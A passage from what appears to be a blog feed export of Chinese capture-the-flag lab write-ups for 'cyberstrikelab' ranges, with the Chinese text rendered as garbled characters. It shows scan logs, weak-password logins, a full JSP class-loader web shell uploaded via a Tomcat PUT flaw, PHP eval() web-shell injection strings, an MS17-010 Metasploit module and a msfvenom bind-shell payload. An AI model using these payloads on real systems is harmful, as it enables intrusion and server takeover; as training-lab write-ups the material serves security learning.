ç«¯å£å¼€æ”¾ 192.168.10.233:8080                                                                 <br>[2025-04-03 18:26:09] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.10.42:3306 =&gt; [mysql] ç‰ˆæœ¬:5.5.23 äº§å“:MySQL Banner:[J.5.5.23.wC*DYsU2.6        <br>W8M]iw=fja<span class="hljs-string">&#x27; mysql_native_password]                                                                                       </span><br><span class="hljs-string">[2025-04-03 18:26:14] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.10.233:8080 =&gt; [http] Banner:[HTTP/1.0 400 Bad Request.Client sent an HT    </span><br><span class="hljs-string">TP request to an HTTPS server.]                                                                                          </span><br><span class="hljs-string">[2025-04-03 18:26:23] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.10.65:3306 =&gt;  Banner:[G.j Host &#x27;</span>192.168.122.20<span class="hljs-string">&#x27; is not allowed to conne    </span><br><span class="hljs-string">ct to this MySQL server]                                                                                                 </span><br><span class="hljs-string">[2025-04-03 18:27:01] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.10.65:135 =&gt;                                                                </span><br><span class="hljs-string">[2025-04-03 18:27:01] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 9                                                                                   </span><br><span class="hljs-string">[2025-04-03 18:27:01] [INFO] å¼€å§‹æ¼æ´æ‰«æ                                                                                      </span><br><span class="hljs-string">[2025-04-03 18:27:01] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle         </span><br><span class="hljs-string">[2025-04-03 18:27:02] [SUCCESS] NetInfo æ‰«æç»“æœ                                                                             </span><br><span class="hljs-string">ç›®æ ‡ä¸»æœº: 192.168.10.65                                                                                                      </span><br><span class="hljs-string">ä¸»æœºå: WIN-BVAJO3C2D90                                                                                                     </span><br><span class="hljs-string">å‘ç°çš„ç½‘ç»œæ¥å£:                                                                                                                 </span><br><span class="hljs-string">   IPv4åœ°å€:                                                                                                               </span><br><span class="hljs-string">      â””â”€ 172.32.50.22                                                                                                    </span><br><span class="hljs-string">   IPv6åœ°å€:                                                                                                               </span><br><span class="hljs-string">      â””â”€ 2002:ac20:3216::ac20:3216                                                                                       </span><br><span class="hljs-string">[2025-04-03 18:27:02] [SUCCESS] NetBios 192.168.10.65   WORKGROUP\WIN-BVAJO3C2D90           Windows Server 2012 R2 Standa</span><br><span class="hljs-string">rd 9600                                                                                                                  </span><br><span class="hljs-string">[2025-04-03 18:27:02] [SUCCESS] ç½‘ç«™æ ‡é¢˜ https://192.168.10.233:8080 çŠ¶æ€ç :404 é•¿åº¦:19     æ ‡é¢˜:æ— æ ‡é¢˜                                </span><br><span class="hljs-string">[2025-04-03 18:27:03] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://192.168.10.65      çŠ¶æ€ç :200 é•¿åº¦:8460   æ ‡é¢˜:æ¢¦æƒ³cmsï¼ˆlmxcmsï¼‰æ˜¯ä¸€å¥—å®Œ                    </span><br><span class="hljs-string">å…¨å…è´¹ã€å¼€æºã€æ— æˆæƒé™åˆ¶çš„ç½‘ç«™ç®¡ç†ç³»ç»Ÿ                                                                                                      </span><br><span class="hljs-string">[2025-04-03 18:50:15] [SUCCESS] æ‰«æå·²å®Œæˆ: 14/14                                                                                                                                               </span><br></code></pre></td></tr></table></figure><p>æ²¡å•¥ä¸œè¥¿ï¼Œä¸»ç«™ä¿¡æ¯æ”¶é›†ä¸€æ³¢ï¼Œæ˜¯<code> lmxcms 1.4</code>ç‰ˆæœ¬ï¼Œä¸Šç½‘çœ‹çœ‹å†å²æ¼æ´</p><p>æƒ³æµ‹ä¸€ä¸‹sqlçš„ä½†æ˜¯æœ‰é˜²ç«å¢™</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403192443432.png" alt="image-20250403192443432"></p><p>å¼±å£ä»¤<code>admin:admin123</code>è¿›å»åå°</p><p>ä¿®æ”¹æ¨¡æ¿æ³¨å…¥ï¼Œ</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403210625875.png" alt="image-20250403210625875"></p><p>èšå‰‘ç›´æ¥è¿æ¥ï¼Œæƒ³æ‰“å¼€<code>flag.txt</code>ä½†æ˜¯æƒé™ä¸å¤Ÿï¼Œä¸Šä¼ csæ­£å‘é©¬è¿æ¥</p>]]></content>
    
    
    <categories>
      
      <category>cyberstrikelab</category>
      
    </categories>
    
    
    <tags>
      
      <tag>é¶åœº</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cyberstrikelab_lab2</title>
    <link href="/2025/04/03/cyberstrikelab-lab2/"/>
    <url>/2025/04/03/cyberstrikelab-lab2/</url>
    
    <content type="html"><![CDATA[<h1 id="å¼€å¹²"><a href="#å¼€å¹²" class="headerlink" title="å¼€å¹²"></a>å¼€å¹²</h1><h3 id="åœºæ™¯ä»‹ç»ï¼š"><a href="#åœºæ™¯ä»‹ç»ï¼š" class="headerlink" title="åœºæ™¯ä»‹ç»ï¼š"></a>åœºæ™¯ä»‹ç»ï¼š</h3><p>é‡ç”Ÿä¹‹æˆ‘æ˜¯æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆï¼Œè¢«å…¬å¸æ´¾é£å»æµ‹è¯•æŸç½‘ç»œçš„å®‰å…¨æ€§ã€‚ä½ çš„ç›®æ ‡æ˜¯æˆåŠŸè·å–æ‰€æœ‰æœåŠ¡å™¨çš„æƒé™ï¼Œä»¥è¯„ä¼°ç½‘ç»œå®‰å…¨çŠ¶å†µã€‚</p><p>è¿æ¥vpnï¼Œæ‰«æç«¯å£</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403111811126.png" alt="image-20250403111811126"></p><p>å‘ç°å…¶å®cmsï¼Œä¿¡æ¯æ”¶é›†ä¸€ä¸‹</p><p><code>fscan</code>æ‰«ä¸€ä¸‹</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[INFO]</span> åŠ è½½çš„æ’ä»¶: <span class="hljs-selector-tag">findnet</span>, <span class="hljs-selector-tag">ms17010</span>, <span class="hljs-selector-tag">mysql</span>, <span class="hljs-selector-tag">netbios</span>, <span class="hljs-selector-tag">smb</span>, <span class="hljs-selector-tag">smb2</span>, <span class="hljs-selector-tag">smbghost</span>, <span class="hljs-selector-tag">ssh</span>, <span class="hljs-selector-tag">webpoc</span>, <span class="hljs-selector-tag">webtitle</span>         <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span> <span class="hljs-selector-tag">CVE-2020-0796</span> <span class="hljs-selector-tag">SmbGhost</span> <span class="hljs-selector-tag">Vulnerable</span>                                          <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> <span class="hljs-selector-tag">NetInfo</span> æ‰«æç»“æœ                                                                             <br>ç›®æ ‡ä¸»æœº: <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span>                                                                                                      <br>ä¸»æœºå: <span class="hljs-selector-tag">DESKTOP-JFB57A8</span>                                                                                                     <br>å‘ç°çš„ç½‘ç»œæ¥å£:                                                                                                                 <br>   <span class="hljs-selector-tag">IPv4</span>åœ°å€:                                                                                                               <br>      â””â”€ <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span>                                                                                                   <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> <span class="hljs-selector-tag">NetInfo</span> æ‰«æç»“æœ                                                                             <br>ç›®æ ‡ä¸»æœº: <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.20</span>                                                                                                      <br>ä¸»æœºå: <span class="hljs-selector-tag">cyberweb</span>                                                                                                            <br>å‘ç°çš„ç½‘ç»œæ¥å£:                                                                                                                 <br>   <span class="hljs-selector-tag">IPv4</span>åœ°å€:                                                                                                               <br>      â””â”€ <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.20</span>                                                                                                   <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> ç½‘ç«™æ ‡é¢˜ <span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//192.168.10.233:8080 çŠ¶æ€ç :404 é•¿åº¦:19     æ ‡é¢˜:æ— æ ‡é¢˜                                </span><br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> <span class="hljs-selector-tag">NetBios</span> <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.20</span>   <span class="hljs-selector-tag">cyberweb</span><span class="hljs-selector-class">.cyberstrikelab</span><span class="hljs-selector-class">.com</span>         <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">Server</span> <span class="hljs-number">2012</span> <span class="hljs-selector-tag">R2</span> <span class="hljs-selector-tag">Standa</span><br><span class="hljs-selector-tag">rd</span> <span class="hljs-number">9600</span>                                                                                                                  <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> ç½‘ç«™æ ‡é¢˜ <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//192.168.10.20:8080 çŠ¶æ€ç :200 é•¿åº¦:11432  æ ‡é¢˜:Apache Tomcat/8.5.19                 </span><br><span class="hljs-selector-attr">[2025-04-03 11:46:50]</span> <span class="hljs-selector-attr">[SUCCESS]</span> ç›®æ ‡: <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//192.168.10.20:8080                                                            </span><br>  æ¼æ´ç±»å‹: <span class="hljs-selector-tag">poc-yaml-iis-put-getshell</span>                                                                                        <br>  æ¼æ´åç§°:                                                                                                                  <br>  è¯¦ç»†ä¿¡æ¯:                                                                                                                  <br>        <span class="hljs-selector-tag">author</span>:<span class="hljs-selector-tag">Cannae</span>(github.com/thunderbarca)                                                                           <br>        <span class="hljs-selector-tag">links</span>:<span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//www.cnblogs.com/-mo-/p/11295400.html                                                               </span><br><span class="hljs-selector-attr">[2025-04-03 11:46:52]</span> <span class="hljs-selector-attr">[SUCCESS]</span> ç½‘ç«™æ ‡é¢˜ <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//192.168.10.10:808  çŠ¶æ€ç :200 é•¿åº¦:20287  æ ‡é¢˜:éª‘å£«PHPé«˜ç«¯äººæ‰ç³»ç»Ÿ(www.74                   </span><br><span class="hljs-selector-tag">cms</span><span class="hljs-selector-class">.com</span>)                                                                                                                 <br><span class="hljs-selector-attr">[2025-04-03 11:46:53]</span> <span class="hljs-selector-attr">[SUCCESS]</span> ç›®æ ‡: <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//192.168.10.20:8080                                                            </span><br>  æ¼æ´ç±»å‹: <span class="hljs-selector-tag">poc-yaml-tomcat-cve-2017-12615-rce</span>                                                                               <br>  æ¼æ´åç§°:                                                                                                                  <br>  è¯¦ç»†ä¿¡æ¯:                                                                                                                  <br>        <span class="hljs-selector-tag">author</span>:<span class="hljs-selector-tag">j4ckzh0u</span>(<span class="hljs-attribute">https</span>:<span class="hljs-comment">//github.com/j4ckzh0u)                                                                     </span><br>        <span class="hljs-attribute">links</span>:<span class="hljs-attribute">https</span>:<span class="hljs-comment">//www.seebug.org/vuldb/ssvid-96562                                                                   </span><br><span class="hljs-attribute">https</span>:<span class="hljs-comment">//mp.weixin.qq.com/s/sulJSg0Ru138oASiI5cYAA                                                                        </span><br>                                                                                                                         <br></code></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªç«™ï¼Œå…ˆçœ‹çœ‹è¿™ä¸ªrceçš„cve  cve-2017-12615</p><p>ä½¿ç”¨burpsuiteæŠ“åŒ…ï¼Œä¿®æ”¹GETä¸ºPUTä¸Šä¼ æ–¹å¼ï¼Œæ·»åŠ æ–‡ä»¶å1.jsp&#x2F;ï¼Œæ·»åŠ shellè„šæœ¬</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>        U(ClassLoader c) &#123;<br>            <span class="hljs-built_in">super</span>(c);<br>        &#125;<br>        <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b, <span class="hljs-number">0</span>, b.length);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] base64Decode(String str) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[]) clazz.getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>).invoke(<span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;ant&quot;</span>);<br>    <span class="hljs-keyword">if</span> (cls != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403122959594.png" alt="image-20250403122959594"></p><p>èšå‰‘è¿æ¥</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403123043272.png" alt="image-20250403123043272"></p><p>æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403123119407.png" alt="image-20250403123119407"></p><p>çœ‹çœ‹ç½‘å¡ï¼Œå‘ç°æ˜¯åŒç½‘å¡</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403123224794.png" alt="image-20250403123224794"></p><p>ä¼ <code>fscan</code>æ‰«æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[2025-04-03 04:35:59] [SERVICE] ç›®æ ‡:192.168.10.10 çŠ¶æ€:identified è¯¦æƒ…:port=808, service=http<br>[2025-04-03 04:35:59] [SERVICE] ç›®æ ‡:192.168.20.30 çŠ¶æ€:identified è¯¦æƒ…:hostname=WIN-7NRTJO59O7N, ipv4=[192.168.20.30], ipv6=[]<br>[2025-04-03 04:35:59] [SERVICE] ç›®æ ‡:192.168.20.20 çŠ¶æ€:identified è¯¦æƒ…:hostname=cyberweb, ipv4=[192.168.10.20], ipv6=[]<br>[2025-04-03 04:35:59] [SERVICE] ç›®æ ‡:192.168.20.20 çŠ¶æ€:identified è¯¦æƒ…:title=Apache Tomcat/8.5.19, url=http://192.168.20.20:8080, status_code=200, length=11432, server_info=map[content-type:text/html;charset=UTF-8 <span class="hljs-built_in">date</span>:Wed, 02 Apr 2025 20:35:59 GMT length:11432 status_code:200 title:Apache Tomcat/8.5.19], fingerprints=[], port=8080, service=http<br>[2025-04-03 04:35:59] [SERVICE] ç›®æ ‡:192.168.20.20 çŠ¶æ€:identified è¯¦æƒ…:domain_name=cyberstrikelab.com, netbios_domain=CYBERSTRIKELAB, netbios_computer=CYBERWEB, workstation_service=CYBERWEB, server_service=CYBERWEB, os_version=Windows Server 2012 R2 Standard 9600, port=139, computer_name=cyberweb.cyberstrikelab.com<br>[2025-04-03 04:36:00] [VULN] ç›®æ ‡:192.168.20.30 çŠ¶æ€:vulnerable è¯¦æƒ…:port=445, vulnerability=MS17-010, os=Windows Server 2008 R2 Standard 7600<br>[2025-04-03 04:36:00] [SERVICE] ç›®æ ‡:192.168.10.233 çŠ¶æ€:identified è¯¦æƒ…:port=8080, service=http, banner=HTTP/1.0 400 Bad Request.Client sent an HTTP request to an HTTPS server.<br>[2025-04-03 04:36:01] [SERVICE] ç›®æ ‡:192.168.10.20 çŠ¶æ€:identified è¯¦æƒ…:port=8080, service=http<br>[2025-04-03 04:36:01] [SERVICE] ç›®æ ‡:192.168.10.20 çŠ¶æ€:identified è¯¦æƒ…:port=8009, service=unknown<br>[2025-04-03 04:36:02] [SERVICE] ç›®æ ‡:192.168.10.10 çŠ¶æ€:identified è¯¦æƒ…:service=mysql, product=MySQL, info=unauthorized, banner=A.j Host <span class="hljs-string">&#x27;CYBERWEB&#x27;</span> is not allowed to connect to this MySQL server, port=3306<br>[2025-04-03 04:36:02] [VULN] ç›®æ ‡:http://192.168.20.20:8080 çŠ¶æ€:vulnerable è¯¦æƒ…:author=Cannae(github.com/thunderbarca), references=[https://www.cnblogs.com/-mo-/p/11295400.html], vulnerability_type=poc-yaml-iis-put-getshell, vulnerability_name=<br>[2025-04-03 04:36:03] [VULN] ç›®æ ‡:http://192.168.20.20:8080 çŠ¶æ€:vulnerable è¯¦æƒ…:vulnerability_type=poc-yaml-tomcat-cve-2017-12615-rce, vulnerability_name=, author=j4ckzh0u(https://github.com/j4ckzh0u), references=[https://www.seebug.org/vuldb/ssvid-96562 https://mp.weixin.qq.com/s/sulJSg0Ru138oASiI5cYAA]<br></code></pre></td></tr></table></figure><p>çœ‹è§<code>192.168.20.30</code>æœ‰ä¸ªæ°¸æ’ä¹‹è“</p><p>æ­å»ºä»£ç†ï¼Œç”¨msfæ‰“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/smb/ms17_010_command<br><span class="hljs-built_in">set</span> rhost 192.168.20.30<br><span class="hljs-built_in">set</span> <span class="hljs-built_in">command</span> <span class="hljs-built_in">type</span> C:\\flag.txt<br>run<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403124829741.png" alt="image-20250403124829741"></p><p>ç°åœ¨çœ‹çœ‹ç¬¬äºŒä¸ªç«™</p><p>æ‰¾åˆ°åå°ç™»å½•åœ°å€<code>/index.php?m=admin&amp;c=index&amp;a=login</code></p><p>è¾“å…¥<code>admin</code>ä¼šæç¤º<code>è´¦å·æˆ–å¯†ç é”™è¯¯</code>è¾“å…¥åˆ«çš„ä¼šæç¤º<code>ç®¡ç†å‘˜è´¦å·ä¸å­˜åœ¨</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403112445766.png" alt="image-20250403112445766"></p><p>å¼±å£ä»¤<code>admin:admin123456</code></p><p>æˆ‘ä»¬æ‰“åå°æ¨¡æ¿ä»£ç æ³¨å…¥æ¼æ´ï¼</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403132250264.png" alt="image-20250403132250264"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /index.php?m=admin&amp;c=tpl&amp;a=set&amp;tpl_dir=&#x27;,&#x27;a&#x27;,eval($_POST[&#x27;cmd&#x27;]),&#x27; HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.10.10:808</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">124.0.0.0</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">124.0.0.0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">192.168.10.10:808</span>/index.php?m=admin&amp;c=tpl&amp;a=index<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-GB;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">Cookie</span>: PHPSESSID=co56nmseg5pps6berl1iv3aa47; think_template=default; think_language=zh-CN<br><span class="hljs-attribute">Connection</span>: keep-alive<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>/Application/Home/Conf/config.php</code></p><p>èšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">go-flag</span><span class="hljs-template-variable">&#123;MP9E4xXhya0TlzVF&#125;</span><br></code></pre></td></tr></table></figure><p><strong>ç®€å•</strong></p>]]></content>
    
    
    <categories>
      
      <category>cyberstrikelab</category>
      
    </categories>
    
    
    <tags>
      
      <tag>é¶åœº</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cyberstrikelab-pt1</title>
    <link href="/2025/03/30/cyberstrikelab-pt1/"/>
    <url>/2025/03/30/cyberstrikelab-pt1/</url>
    
    <content type="html"><![CDATA[<h1 id="å¼€å¹²"><a href="#å¼€å¹²" class="headerlink" title="å¼€å¹²"></a>å¼€å¹²</h1><p><strong>é¢˜ç›®</strong>ï¼šæœ€ç»ˆä»»åŠ¡æ˜¯è·å–ç®¡ç†å‘˜çš„å¯†ç ï¼Œèƒ½åšåˆ°å—ï¼Ÿ</p><p>ä¿®æ”¹<code>client</code>é…ç½®ï¼Œè®¾ç½®ç‰¹å®šç½‘æ®µèµ°<code>vpn</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">route</span>-nopull<br><span class="hljs-attribute">route</span> <span class="hljs-number">10.0.0.0</span> <span class="hljs-number">255.255.255.0</span> vpn_gateway<br></code></pre></td></tr></table></figure><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>è¿›å…¥ç½‘å€å‘ç°æ˜¯<code>seacms</code>ä½†æ˜¯ä¸çŸ¥é“æ˜¯ä»€ä¹ˆç‰ˆæœ¬</p><p>æ‰¾åˆ°ç‰ˆæœ¬ç½‘å€<code>http://10.0.0.68/DATA/ADMIN/VER.TXT</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330134844810.png" alt="image-20250330134844810"></p><p>ç‰ˆæœ¬æ˜¯12.9ï¼Œæœç´¢ä¸€æ³¢å†å²æ¼æ´</p><p>è®¿é—®<code>/cslab</code>è¿›å…¥ç™»å½•é¡µé¢</p><p>ä½¿ç”¨<code>cslab:cslab</code>è¿›å…¥</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330135241959.png" alt="image-20250330135241959"></p><p>å‘ç°</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330135656100.png" alt="image-20250330135656100"></p><p>ä¸æ¼æ´é‡åˆï¼Œå°è¯•å†™é©¬</p><p>æ‹¼æ¥ä¸€ä¸ªæœ¨é©¬è¿›å»</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;;<span class="hljs-keyword">@eval</span>($_POST[cmd]);<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330135906147.png" alt="image-20250330135906147"></p><p>è™šæ‹Ÿæœºèšå‰‘è¿æ¥(è®°å¾—NATæ¨¡å¼)</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330140221588.png" alt="image-20250330140221588"></p><p>æ‰¾åˆ°ç¬¬ä¸€ä¸ª</p><p>ç¬¬äºŒå…³æ˜¯administratorç”¨æˆ·çš„ntmlhashå€¼(å±…ç„¶ä¸æ˜¯å¯†ç ğŸ¤£)</p><p>ä½¿ç”¨msfç”Ÿæˆæ­£å‘è¿æ¥æœ¨é©¬åœ¨è¿è¡Œæœ¨é©¬</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/bind_tcp <span class="hljs-attribute">LHOST</span>=0.0.0.0 <span class="hljs-attribute">LPORT</span>=4444 -f exe &gt; shell.exe <br></code></pre></td></tr></table></figure><p>åœ¨æ‹¿shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br> <br>use exploit/multi/handler<br> <br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br> <br><span class="hljs-built_in">set</span> rhost 10.0.0.68<br> <br><span class="hljs-built_in">set</span> lport 4444<br> <br>run<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330154457649.png" alt="image-20250330154457649"></p>]]></content>
    
    
    <categories>
      
      <category>cyberstrikelab</category>
      
    </categories>
    
    
    <tags>
      
      <tag>é¶åœº</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cyberstrikelab_lab1</title>
    <link href="/2025/03/30/cyberstrikelab-lab1/"/>
